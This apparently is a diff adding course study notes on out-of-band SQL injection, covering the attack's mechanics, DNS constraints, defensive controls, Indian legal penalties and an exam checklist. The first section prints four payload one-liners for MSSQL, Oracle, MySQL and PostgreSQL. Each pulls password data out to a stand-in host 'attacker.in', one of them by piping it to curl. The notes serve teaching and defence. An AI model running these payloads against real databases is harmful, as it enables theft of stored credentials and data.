@@ -1,0 +1,83 @@
+================================================================================
+CODER & ACCOTAX ACADEMIC STUDY NOTES : CYBER SECURITY (BCAC703)
+MODULE 004_005 : WEB ATTACKS, SQL INJECTION & INJECTION DEFENSE
+TOPIC 05       : OUT-OF-BAND (OOB) SQL INJECTION
+AUTHOR         : SUKANTA HUI  |  LOCATION : BARRACKPORE, WEST BENGAL, INDIA
+================================================================================
+
+1. EXECUTIVE OVERVIEW & OUT-OF-BAND EXTRACTION TAXONOMY
+--------------------------------------------------------------------------------
+Out-of-Band (OOB) SQL Injection occurs when the database server is coerced into initiating external 
+network connections (DNS queries, HTTP requests, or SMB connections) to an attacker-controlled listener, 
+transmitting exfiltrated data out-of-band:
+
+  * THE 4 CORE OOB DIALECT MECHANISMS :
+    1. MICROSOFT SQL SERVER : `xp_dirtree '\\\\'+(SELECT pass)+'.attacker.in\\a'` (UNC DNS / SMB Relay).
+    2. ORACLE DATABASE      : `UTL_HTTP.REQUEST('http://attacker.in/' || (SELECT pass))` / `UTL_INADDR`.
+    3. MySQL / MariaDB      : `LOAD_FILE(CONCAT('\\\\\\\\', (SELECT pass), '.attacker.in\\\\a.txt'))`.
+    4. PostgreSQL           : `COPY (SELECT pass) TO PROGRAM 'curl -d @- http://attacker.in'`.
+
+--------------------------------------------------------------------------------
+2. RFC 1035 DNS CONSTRAINTS & BANDWIDTH ADVANTAGE
+--------------------------------------------------------------------------------
+
+  * RFC 1035 CONSTRAINTS :
+    - Maximum Subdomain Label Length : Exactly 63 Octets / Characters ($L_{\text{label}} = 63$).
+    - Maximum FQDN Domain Length     : Exactly 253 Octets / Characters.
+    - Character Whitelist            : `[a-zA-Z0-9-]` (Requires Hex or Base32 encoding of secrets).
+
+  * BANDWIDTH ACCELERATION FACTOR :
+    - Time-Based Blind SQLi Speed    : ~0.028 Bytes / Second (Requires 112 queries with 5s sleep delays).
+    - Out-of-Band DNS Exfiltration   : ~630.0 Bytes / Second (Single DNS query in 100 milliseconds).
+    - Acceleration Factor            : OOB DNS is $\approx 22,500\text{ TIMES FASTER}$ than Blind Timing!
+
+--------------------------------------------------------------------------------
+3. ENTERPRISE DEFENSIVE ARCHITECTURE & EGRESS HARDENING
+--------------------------------------------------------------------------------
+
++-------------------+---------+-----------------------------+-----------------------------+
+| DEFENSE LAYER     | FOCUS   | IMPLEMENTATION MECHANISM    | VULNERABILITY NEUTRALIZED   |
++-------------------+---------+-----------------------------+-----------------------------+
+| Parameterized     | Query   | Pre-compiles AST template;  | Eliminates 100% of injected |
+| Prepared Stmts    | Layer   | treats inputs as data.      | OOB stored procedure calls. |
+|                   |         |                             |                             |
+| DB Subnet Network | Network | Firewall drops all outbound | Completely blocks outbound  |
+| Egress Filtering  | Tier    | ports (53, 80, 443, 445).   | DNS and HTTP sockets!       |
+|                   |         |                             |                             |
+| Revoke Extended   | DB User | `REVOKE EXECUTE ON xp_dir-  | Prevents non-admins from    |
+| Stored Procedures | Privs   | tree FROM PUBLIC;`          | executing network packages. |
+|                   |         |                             |                             |
+| Split-Horizon     | DNS     | Drops public internet root  | Prevents DNS lookups from   |
+| Internal DNS      | Infra   | lookups from DB resolvers.  | reaching external attackers.|
++-------------------+---------+-----------------------------+-----------------------------+
+
+================================================================================
+4. STATUTORY & REGULATORY COMPLIANCE IN INDIA
+================================================================================
+
+  * INFORMATION TECHNOLOGY ACT 2000 :
+    - Section 66F   : OOB SQLi exfiltrating Critical Infrastructure is CYBER TERRORISM (LIFE IMPRISONMENT).
+    - Section 70    : Unauthorized access to PROTECTED SYSTEMS (Up to 10 YEARS IMPRISONMENT + Fine).
+    - Section 43(a) : Civil compensation up to ₹1 CRORE for unauthorized database extraction.
+    - Section 66    : Criminal hacking & data manipulation (Up to 3 Years Prison + Fine).
+
+  * INDIAN PENAL CODE (IPC) :
+    - Section 420   : Cheating & Commercial Trade Secret Theft (Up to 7 Years Prison).
+    - Section 427   : Mischief & Digital Property Exfiltration (Up to 2 Years Prison).
+
+  * CERT-In MANDATORY INCIDENT REPORTING DIRECTIVE :
+    - Database breaches resulting from OOB SQLi must be reported within 6 HOURS.
+
+  * DIGITAL PERSONAL DATA PROTECTION (DPDP) ACT 2023 :
+    - Section 8(5) & 33: Mandatory reasonable security safeguards; failure triggers fines up to ₹250 CRORES.
+
+================================================================================
+5. STUDENT MINI CHECKLIST (EXAM & CAREER ESSENTIALS)
+================================================================================
+  [✔] OOB SQLi coerces the database to initiate outbound DNS or HTTP network requests.
+  [✔] MSSQL `xp_dirtree` and Oracle `UTL_INADDR` exfiltrate data inside DNS subdomain labels.
+  [✔] DNS exfiltration bypasses inbound firewalls by recursing through internal corporate DNS servers.
+  [✔] RFC 1035 limits single DNS subdomain labels to a maximum of 63 characters.
+  [✔] Blocking outbound network egress (Ports 53, 80, 445) from database subnets neutralizes OOB attacks.
+  [✔] Section 66F of the IT Act penalizes OOB SQL injection cyber terrorism with Life Imprisonment.
+================================================================================
